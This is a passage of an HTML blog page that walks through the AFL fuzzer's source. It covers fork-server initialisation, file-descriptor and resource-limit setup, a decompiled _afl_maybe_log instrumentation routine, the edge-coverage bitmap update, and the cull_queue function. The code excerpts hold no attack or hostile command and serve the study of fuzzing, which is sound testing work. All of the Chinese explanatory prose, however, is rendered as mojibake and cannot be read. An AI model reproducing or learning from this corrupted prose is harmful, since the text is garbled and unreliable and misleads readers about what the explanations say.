class="line"></span><br><span class="line"><span class="keyword">if</span> (!forksrv_pid) &#123;</span><br><span class="line">    <span class="comment">// å­è¿›ç¨‹ä»£ç  - å°†æˆä¸ºfork server</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// çˆ¶è¿›ç¨‹ä»£ç  - AFLä¸»è¿›ç¨‹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å­è¿›ç¨‹"><a href="#å­è¿›ç¨‹" class="headerlink" title="å­è¿›ç¨‹"></a>å­è¿›ç¨‹</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rlimit</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">getrlimit</span>(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="number">2</span>) &#123;</span><br><span class="line">    r.rlim_cur = FORKSRV_FD + <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_NOFILE, &amp;r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¡®ä¿æœ‰è¶³å¤Ÿçš„æ–‡ä»¶æè¿°ç¬¦</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mem_limit) &#123;</span><br><span class="line">    r.rlim_max = r.rlim_cur = ((<span class="type">rlim_t</span>)mem_limit) &lt;&lt; <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_AS, &amp;r);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_DATA, &amp;r);  <span class="comment">// OpenBSD</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸åŒç³»ç»Ÿä½¿ç”¨ä¸åŒçš„å†…å­˜é™åˆ¶ç±»å‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">setrlimit</span>(RLIMIT_CORE, &amp;r);</span><br></pre></td></tr></table></figure><p>æ ¸å¿ƒè½¬å‚¨å½±å“æ€§èƒ½ï¼Œä¸”åœ¨æ¨¡ç³Šæµ‹è¯•ä¸­ä¸éœ€è¦ï¼Œå› æ­¤ç¦ç”¨äº†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setsid</span>();                        <span class="comment">// åˆ›å»ºæ–°ä¼šè¯ï¼Œè„±ç¦»æ§åˆ¶ç»ˆç«¯</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dup2</span>(dev_null_fd, <span class="number">1</span>);           <span class="comment">// stdout â†’ /dev/null</span></span><br><span class="line"><span class="built_in">dup2</span>(dev_null_fd, <span class="number">2</span>);           <span class="comment">// stderr â†’ /dev/null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (out_file) &#123;</span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">0</span>);       <span class="comment">// stdin â†’ /dev/null</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">dup2</span>(out_fd, <span class="number">0</span>);            <span class="comment">// stdin â†’ æµ‹è¯•æ•°æ®</span></span><br><span class="line">    <span class="built_in">close</span>(out_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);        <span class="comment">// 198</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);     <span class="comment">// 199</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>å°†ç®¡é“æ˜ å°„åˆ°å›ºå®šçš„æ–‡ä»¶æè¿°ç¬¦198å’Œ199ä¸Š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;LD_BIND_LAZY&quot;</span>)) <span class="built_in">setenv</span>(<span class="string">&quot;LD_BIND_NOW&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>åœ¨ç¨‹åºå¯åŠ¨æ—¶è§£ææ‰€æœ‰ç¬¦å·ï¼Œé¿å…forkåçš„é“¾æ¥å·¥ä½œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>, <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                       <span class="string">&quot;detect_leaks=0:&quot;</span></span><br><span class="line">                       <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                       <span class="string">&quot;allocator_may_return_null=1&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">setenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot;:&quot;</span></span><br><span class="line">                       <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                       <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                       <span class="string">&quot;allocator_may_return_null=1:&quot;</span></span><br><span class="line">                       <span class="string">&quot;msan_track_origins=0&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">execv</span>(target_path, argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœexecvå¤±è´¥</span></span><br><span class="line">*(u32*)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ç›´æ¥æ‰§è¡Œexecvå‡½æ•°</p><p>æ‰§è¡Œå®Œä¹‹åè¿™ä¸ªæ–°çš„è¿›ç¨‹å°±ä¼šæ›¿æ¢æ‰è¿™ä¸ªå­è¿›ç¨‹ï¼Œä½†æ˜¯æ–‡ä»¶æè¿°ç¬¦ã€PIDä»¥åŠç›¸åº”çš„èµ„æºé™åˆ¶éƒ½ä¼šç»§æ‰¿</p><p>å¦‚æœå½“æ—¶æ˜¯å¯¹testç¨‹åºè¿›è¡Œfuzzçš„è¯ï¼Œæ­¤æ—¶target_pathå’Œargvéƒ½ä¼šæŒ‡å‘è¯¥ç¨‹åºçš„ç»å¯¹è·¯å¾„</p><p>å› æ­¤è¿™ä¸ªå­è¿›ç¨‹å°±ä¼šå˜æˆä¸€ä¸ªtestè¿›ç¨‹</p><blockquote><p>execvå‚æ•°è®¾ç½®ï¼š</p><ol><li>pathï¼šæŒ‡å‘è¦æ‰§è¡Œç¨‹åºçš„ç»å¯¹è·¯å¾„ï¼Œä¾‹å¦‚ï¼šâ€&#x2F;bin&#x2F;lsâ€;</li><li>argvï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š{â€œlsâ€, â€œ-lâ€, â€œ&#x2F;tmpâ€, NULL};</li><li>envï¼šæ‰§è¡Œç¯å¢ƒå˜é‡çš„Cè¯­è¨€å­—ç¬¦ä¸²</li></ol></blockquote><h3 id="çˆ¶è¿›ç¨‹ï¼ˆAFLä¸»è¿›ç¨‹ï¼‰"><a href="#çˆ¶è¿›ç¨‹ï¼ˆAFLä¸»è¿›ç¨‹ï¼‰" class="headerlink" title="çˆ¶è¿›ç¨‹ï¼ˆAFLä¸»è¿›ç¨‹ï¼‰"></a>çˆ¶è¿›ç¨‹ï¼ˆAFLä¸»è¿›ç¨‹ï¼‰</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);    <span class="comment">// å…³é—­æ§åˆ¶ç®¡é“è¯»ç«¯</span></span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);     <span class="comment">// å…³é—­çŠ¶æ€ç®¡é“å†™ç«¯</span></span><br><span class="line"></span><br><span class="line">fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];  <span class="comment">// ä¿å­˜æ§åˆ¶ç®¡é“å†™ç«¯</span></span><br><span class="line">fsrv_st_fd  = st_pipe[<span class="number">0</span>];   <span class="comment">// ä¿å­˜çŠ¶æ€ç®¡é“è¯»ç«¯</span></span><br></pre></td></tr></table></figure><p>è®¾ç½®ç®¡é“çš„ç«¯ç‚¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è®¾ç½®è¶…æ—¶å®šæ—¶å™¨</span></span><br><span class="line">it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="number">1000</span>);</span><br><span class="line">it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="number">1000</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰å¾…4å­—èŠ‚helloæ¶ˆæ¯</span></span><br><span class="line">rlen = <span class="built_in">read</span>(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸…é™¤å®šæ—¶å™¨</span></span><br><span class="line">it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>æ¡æ‰‹ç­‰å¾…</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">OKF</span>(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸä¼šè¿™æ ·</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (child_timed_out)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¶…æ—¶</p><h3 id="æ‰§è¡Œæ’æ¡©ä»£ç åˆ†æ"><a href="#æ‰§è¡Œæ’æ¡©ä»£ç åˆ†æ" class="headerlink" title="æ‰§è¡Œæ’æ¡©ä»£ç åˆ†æ"></a>æ‰§è¡Œæ’æ¡©ä»£ç åˆ†æ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_afl_maybe_log(argc, argv, envp, <span class="number">43576LL</span>);</span><br></pre></td></tr></table></figure><p>a4æ˜¯è¿™ä¸ªå‡½æ•°çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯ä¸€ä¸ªæ—¶é—´æˆ³çš„éšæœºæ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall _afl_maybe_log(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// of</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// edi</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp-10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+10h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+18h] [rbp-158h]</span></span><br><span class="line"></span><br><span class="line">  v5 = v4;</span><br><span class="line">  v6 = _afl_area_ptr;</span><br><span class="line">  <span class="keyword">if</span> ( !_afl_area_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_setup_failure )</span><br><span class="line">      <span class="keyword">return</span> v5 + <span class="number">127</span>;</span><br><span class="line">    v6 = _afl_global_area_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_global_area_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      _afl_area_ptr = _afl_global_area_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = v4;</span><br><span class="line">      v17 = a4;</span><br><span class="line">      v9 = <span class="built_in">getenv</span>(<span class="string">&quot;__AFL_SHM_ID&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v9 || (v10 = <span class="built_in">atoi</span>(v9), v11 = <span class="built_in">shmat</span>(v10, <span class="number">0LL</span>, <span class="number">0</span>), v11 == (<span class="type">void</span> *)<span class="number">-1LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++_afl_setup_failure;</span><br><span class="line">        v5 = v16;</span><br><span class="line">        <span class="keyword">return</span> v5 + <span class="number">127</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _afl_area_ptr = (__int64)v11;</span><br><span class="line">      _afl_global_area_ptr = v11;</span><br><span class="line">      v15 = (__int64)v11;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4uLL</span>) == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="number">198</span>;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">read</span>(<span class="number">198</span>, &amp;_afl_temp, <span class="number">4uLL</span>) != <span class="number">4</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">LODWORD</span>(v13) = fork();</span><br><span class="line">          <span class="keyword">if</span> ( v13 &lt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v13 )</span><br><span class="line">            <span class="keyword">goto</span> __afl_fork_resume;</span><br><span class="line">          _afl_fork_pid = v13;</span><br><span class="line">          <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_fork_pid, <span class="number">4uLL</span>);</span><br><span class="line">          v12 = _afl_fork_pid;</span><br><span class="line">          <span class="built_in">LODWORD</span>(v14) = <span class="built_in">waitpid</span>(_afl_fork_pid, &amp;_afl_temp, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v14 &lt;= <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4uLL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        _exit(v12);</span><br><span class="line">      &#125;</span><br><span class="line">__afl_fork_resume:</span><br><span class="line">      <span class="built_in">close</span>(<span class="number">198</span>);</span><br><span class="line">      <span class="built_in">close</span>(<span class="number">199</span>);</span><br><span class="line">      v6 = v15;</span><br><span class="line">      v5 = v16;</span><br><span class="line">      a4 = v17;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = _afl_prev_loc ^ a4;</span><br><span class="line">  _afl_prev_loc ^= v7;</span><br><span class="line">  _afl_prev_loc = (<span class="type">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  ++*(_BYTE *)(v6 + v7);</span><br><span class="line">  <span class="keyword">return</span> v5 + <span class="number">127</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v9 = <span class="built_in">getenv</span>(<span class="string">&quot;__AFL_SHM_ID&quot;</span>);           <span class="comment">// è·å–å…±äº«å†…å­˜ID</span></span><br><span class="line">v10 = <span class="built_in">atoi</span>(v9);                       <span class="comment">// è½¬æ¢ä¸ºæ•´æ•°</span></span><br><span class="line">v11 = <span class="built_in">shmat</span>(v10, <span class="number">0LL</span>, <span class="number">0</span>);             <span class="comment">// è¿æ¥å…±äº«å†…å­˜</span></span><br></pre></td></tr></table></figure><p>è¿æ¥å…±äº«å†…å­˜</p><h4 id="Forkserver"><a href="#Forkserver" class="headerlink" title="Forkserver"></a>Forkserver</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 1. ç­‰å¾…AFLçš„forkè¯·æ±‚</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">198</span>, &amp;_afl_temp, <span class="number">4uLL</span>) != <span class="number">4</span>) <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. åˆ›å»ºå­è¿›ç¨‹</span></span><br><span class="line">    <span class="built_in">LODWORD</span>(v13) = fork();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!v13) &#123;</span><br><span class="line">        <span class="comment">// å­è¿›ç¨‹ï¼šè·³è½¬åˆ°æ­£å¸¸ç¨‹åºæ‰§è¡Œ</span></span><br><span class="line">        <span class="keyword">goto</span> __afl_fork_resume;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. çˆ¶è¿›ç¨‹ï¼šå‘é€å­è¿›ç¨‹PIDç»™AFL</span></span><br><span class="line">    _afl_fork_pid = v13;</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_fork_pid, <span class="number">4uLL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. ç­‰å¾…å­è¿›ç¨‹ç»“æŸå¹¶å‘é€é€€å‡ºçŠ¶æ€</span></span><br><span class="line">    <span class="built_in">waitpid</span>(_afl_fork_pid, &amp;_afl_temp, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸºäºè¾¹çš„è¦†ç›–ä½å›¾è·Ÿè¸ªï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v7 = _afl_prev_loc ^ a4;                    <span class="comment">// è®¡ç®—è¾¹çš„å“ˆå¸Œå€¼</span></span><br><span class="line">_afl_prev_loc ^= v7;                        <span class="comment">// ç­‰æ•ˆäºï¼š_afl_prev_loc = a4</span></span><br><span class="line">_afl_prev_loc = _afl_prev_loc &gt;&gt; <span class="number">1</span>;         <span class="comment">// å³ç§»1ä½ï¼Œä½œä¸ºä¸‹æ¬¡çš„prev_loc</span></span><br><span class="line">++*(_BYTE *)(v6 + v7);                      <span class="comment">// åœ¨ä½å›¾ä¸­å¢åŠ è®¡æ•°</span></span><br></pre></td></tr></table></figure><h2 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">cull_queue</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">queue_entry</span>* q;</span><br><span class="line">  <span class="type">static</span> u8 temp_v[MAP_SIZE &gt;&gt; <span class="number">3</span>];</span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode || !score_changed) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  score_changed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(temp_v, <span class="number">255</span>, MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">  queued_favored  = <span class="number">0</span>;</span><br><span class="line">  pending_favored = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  q = queue;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    q-&gt;favored = <span class="number">0</span>;</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Let&#x27;s see if anything in the bitmap isn&#x27;t captured in temp_v.</span></span><br><span class="line"><span class="comment">     If yes, and if it has a top_rated[] contender, let&#x27;s use it. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line">    <span class="keyword">if</span> (top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="number">3</span>] &amp; (<span class="number">1</span> &lt;&lt; (i &amp; <span class="number">7</span>)))) &#123;</span><br><span class="line"></span><br><span class="line">      u32 j = MAP_SIZE &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Remove all bits belonging to the current entry from temp_v. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (j--) </span><br><span class="line">        <span class="keyword">if</span> (top_rated[i]-&gt;trace_mini[j])</span><br><span class="line">          temp_v[j] &amp;= ~top_rated[i]-&gt;trace_mini[j];</span><br><span class="line"></span><br><span class="line">      top_rated[i]-&gt;favored = <span class="number">1</span>;</span><br><span class="line">      queued_favored++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!top_rated[i]-&gt;was_fuzzed) pending_favored++;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  q = queue;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (q) &#123;</span><br><span class="line">    <span class="built_in">mark_as_redundant</span>(q, !q-&gt;favored);</span><br><span class="line">    q = q-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode || !score_changed) <span class="keyword">return</span>;</span><br><span class="line">score_changed = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(temp_v, <span class="number">255</span>, MAP_SIZE &gt;&gt; <span class="number">3</span>);  <span class="comment">// å°†æ‰€æœ‰ä½è®¾ä¸º1</span></span><br><span class="line">queued_favored = <span class="number">0</span>;</span><br><span class="line">pending_favored = <span 